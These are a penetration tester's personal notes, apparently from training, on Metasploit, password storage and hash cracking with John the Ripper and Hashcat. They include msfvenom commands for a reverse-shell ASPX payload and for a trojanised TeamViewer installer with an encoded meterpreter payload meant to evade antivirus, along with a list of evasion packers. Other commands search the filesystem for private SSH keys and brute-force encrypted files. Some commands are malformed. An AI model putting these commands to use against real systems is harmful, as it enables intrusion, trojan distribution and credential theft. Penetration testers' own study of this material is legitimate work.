# Metasploit Framework 
<br>

### Automated Tools 
```
We will never have enough time to complete the assessment. With the number of technologies in use in every single environment variation, we will not be offered the time to do a complete, comprehensive assessment. Time is money, and we are on the clock for a non-tech-savvy customer, and we need to complete the bulk of the work first: the issues with the most potential impact and highest remediation turnover.
Credibility can be an issue even if we make our tools or manually exploit every service. We are not competing against other industry members but rather against pre-set economic conditions and personal beliefs from the customer management level. They would not comprehend or give much importance to accolades. They just want the work done in the highest possible quantity, in the least amount of time.
You only have to impress yourself, not the infosec community. If we achieve the first, the latter will come naturally. Using the same example as above, many artists with an online presence stray from their original goals in pursuit of online validation. Their art becomes stale and generic to the keen eye, but to the everyday user, it contains the wanted visual elements and themes, not those their followers do not yet know they want. As security researchers or penetration testers, we only must validate vulnerabilities, not validate our ego.

# msfvenom

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx



# Firewall and IDS/IPS Evasion 

 Evasion Techs
    1. embed payload 
    msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5A

    2. Archive it 
        msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5

    3. compress it to avoid av

    4. Packers 
        Alternate EXE Packer, MEW, ExeStealth, Themida, Morphine 

    5. change offset
        
    6. avoid nop sleds 

```

<br> 

### Password Attacks 
```
# Links
    1. https://tldp.org/HOWTO/pdf/User-Authentication-HOWTO.pdf
    2. https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication


# Linux Auth
    1. /etc/shadow - stores encrypted passwords and can only be read by root 
    2. /etc/passwd - stores user information but not the password lmao 
    3. /etc/group - stores information about groups 

# Windows Auth
    1. LSA - subsystem that authenticates users and logs them into the computer 
    2. LSASS - security policy, user auth, security logs 
    3. SAM - database that stores users passwords (/etc/shadow) (Ether LM or NTLM Hash)A
    4. Credential Manager - stores user creds for further use 
        4a. PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
    5. NTDS - Database for DC's that stores User Accounts, Group Accounts, Computer accounts, policy

```

<br> 

### John The Ripper 
```
# Notes 
    1. cracked hashes go to ~/.john/john.pot
    2. Show progressw with "john --show"
    3. Find john scripts 
        3a. locate *2john*

# Single Crack Mode 
    1. john --format=<hash_type> <hash or file> 

# Wordlist mode 
    1. john --wordlist=<wordlist_file> --rules <hash_file>

# Incremental mode 
    1. Generates all possible combinations of characters, starting with a single character and incrementing with each iteration

# Cracking Secured Files 
    1. <tool> <file_to_crack> > file.hash
    2. Ex. pdf2john server_doc.pdf > server_doc.hash


```


### Hashcat
```
# Hashid 
    1. use hashid -m to show hashcat mode

# Rules 
    1. https://hashcat.net/wiki/doku.php?id=rule_based_attack
    2. best64.rule is favored 
    3. password generation tool
        3a. https://github.com/digininja/CeWL
    4. https://github.com/Mebus/cupp


```


### Cracking Protected Files 
```
# Find protected files 
    for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Search for SSH keys since they all start with the same header 
    grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
    
# You can test if an SSH key is portected using ssh-keygen to read it
    ssh-keygen -yf ~/.ssh/id_rsa 

# John crack ssh key 
    1. ssh2john.py sshkey > output.hash
    2. john --wordlist=[] output.hash
    3. john ssh.hash --show 

```

### Cracking archived / ZIP files 
```
# Get list of compression ext
    1. curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt

# John
    1. zip2john 

# openssl can be used to password protect files 
    1. Run 'file' on the file to identify this

# Simple for loop to crack openssl protected file 
    1. for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

# Bitlocker (Windows, Full Disk Encryption feature) 
    1. bitlocker2john
    2. https://openwall.info/wiki/john/OpenCL-BitLocker
    3. Use 'dislocker' to mount the drive to linux systems
        3a. sudo mkdir -p /media/bitlocker
        3b. sudo mkdir -p /media/bitlockermount 
        3c. sudo losetup -f -P Backup.vhd
        3d. sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
        3d. sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
        3e. cd /media/bitlocker/
```
